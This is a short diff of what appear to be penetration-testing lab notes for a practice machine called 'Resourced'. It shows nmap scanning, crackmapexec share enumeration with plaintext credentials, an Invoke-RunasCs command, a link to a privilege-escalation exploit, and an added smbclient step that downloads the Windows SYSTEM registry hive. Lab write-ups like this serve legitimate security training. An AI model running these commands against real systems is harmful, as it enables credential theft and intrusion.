@@ -986,7 +986,7 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote
 # https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 ```
 
-### Resourced
+### Resourced - SMB - SYSTEM File - 
 ```shell
 sudo nmap -sC -sV -Pn -p- 192.168.124.175 -oN 124.175_allport
 PORT      STATE SERVICE       VERSION
@@ -1044,6 +1044,8 @@ crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
 crackmapexec smb 192.168.124.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --spider 'Password Audit' --regex .
 smbclient //192.168.124.175/Password\ Audit -U 'resourced.local\V.Ventz'
 cd registry
+get SYSTEM
+
 
 ```
 
